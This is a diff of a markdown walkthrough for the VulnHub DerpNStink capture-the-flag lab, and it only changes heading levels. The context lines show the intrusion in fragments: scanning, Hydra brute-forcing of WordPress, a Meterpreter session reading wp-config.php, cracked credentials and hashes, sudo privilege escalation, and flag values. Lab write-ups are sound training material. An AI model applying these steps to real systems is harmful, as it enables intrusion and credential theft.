@@ -4,9 +4,7 @@
 Available on VulnHub: https://www.vulnhub.com/entry/derpnstink-1,221/
 
 
-## Walkthrough
-
-### IP Discovery
+## IP Discovery
 
 ```
 $ sudo netdiscover -r 192.168.1.0/16
@@ -29,7 +27,7 @@ xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 xxx.xxx.x.xxx   xx:xx:xx:xx:xx:xx      x      xx  xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
-### Port Scanning
+## Port Scanning
 
 ```
 $ nmap -AT4 -p- 192.168.1.127
@@ -59,7 +57,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 11.18 seconds
 ```
 
-### Flag #1
+## Flag #1
 
 HTML Source Inspection
 ```
@@ -72,7 +70,7 @@ HTML Source Inspection
 .
 ```
 
-### Web Analysis
+## Web Analysis
 
 ```
 $ nikto -host http://192.168.1.127
@@ -379,7 +377,7 @@ PhP MyAdmin Login Page: http://192.168.1.127/php/phpmyadmin/index.php \
 WordPress Login Page: http://derpnstink.local/weblog/wp-login.php \
 WebLog Page: http://192.168.1.127/weblog/index.php
 
-### WordPress Analysis
+## WordPress Analysis
 
 ```
 $ wpscan --url http://derpnstink.local/weblog/
@@ -515,7 +513,7 @@ Interesting Finding(s):
 
 Users: **admin**, **unclestink**
 
-### WordPress Login Brute Forcing
+## WordPress Login Brute Forcing
 
 I used the BurpSuit as proxy to intercept the WordPress login request
 ```
@@ -576,7 +574,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-11 18:01:
 
 WordPress Credentials: **admin** : **admin**
 
-### Exploitation
+## Exploitation
 
 Exploiting WordPress SlideShow Component ( https://www.exploit-db.com/exploits/34514 )
 ```
@@ -653,7 +651,7 @@ OS          : Linux DeRPnStiNK 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 1
 Meterpreter : php/linux
 ```
 
-### DataBase Info Acquiring
+## DataBase Info Acquiring
 
 ```
 meterpreter > cat /var/www/html/weblog/wp-config.php
@@ -754,7 +752,7 @@ DB_USER: **root** \
 DB_PASSWORD: **mysql** \
 DB_HOST: **localhost**
 
-### MySQL Connect
+## MySQL Connect
 
 Using PhPMyAdmin login ( root:mysql )
 ```
@@ -789,7 +787,7 @@ Credentials: \
 **unclestinky** : **$P$BW6NTkFvboVVCHU2R9qmNai1WfHSC41** \
 **admin** : **$P$BgnU3VLAv.RWd3rdrkfVIuQr6mFvpd/**
 
-### Flag #2
+## Flag #2
 
 ```
 SQL query: SELECT * FROM `wp_posts`
@@ -797,7 +795,7 @@ SQL query: SELECT * FROM `wp_posts`
 flag2(a7d355b26bda6bf1196ccffead0b2cf2b81f0a9de5b4876b44407f1dc07e51e6)
 ```
 
-### Credentials Cracking
+## Credentials Cracking
 
 Hash identification
 ```
@@ -892,7 +890,7 @@ Stopped: Sun Oct 11 19:40:12 2020
 
 Credentials: **unclestinky** : **wedgie57**
 
-### Privilege Escalation
+## Privilege Escalation
 
 Spwaning a shell
 ```
@@ -910,7 +908,7 @@ Password: wedgie57
 stinky@DeRPnStiNK:/var/www/html/temporary$
 ```
 
-### SSH Access
+## SSH Access
 
 Copying `stinky` SSH key to `/var/www/html/temporary/` so we can download it on host machine and access via SSH
 ```
@@ -956,7 +954,7 @@ stinky@DeRPnStiNK:~$ id
 uid=1001(stinky) gid=1001(stinky) groups=1001(stinky)
 ```
 
-### Flag #3
+## Flag #3
 
 ```
 stinky@DeRPnStiNK:~$ cat Desktop/flag.txt
@@ -964,7 +962,7 @@ stinky@DeRPnStiNK:~$ cat Desktop/flag.txt
 flag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb)
 ```
 
-### Network Packet Capture File
+## Network Packet Capture File
 
 In `/home/stinky/Documents` we have a `.pcap` file. I downloaded it and open with `Wireshark`.
 ```
@@ -984,7 +982,7 @@ Form item: "pwd" = "derpderpderpderpderpderpderp"
 
 Credentials: **mrderp** : **derpderpderpderpderpderpderp**
 
-### Privilege Escalation
+## Privilege Escalation
 
 Horizontal escalation to `mrderp` user
 ```
@@ -1028,7 +1026,7 @@ mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh
 root@DeRPnStiNK:~/binaries#
 ```
 
-### Flag #4
+## Flag #4
 
 ```
 root@DeRPnStiNK:/root/Desktop# cat flag.txt
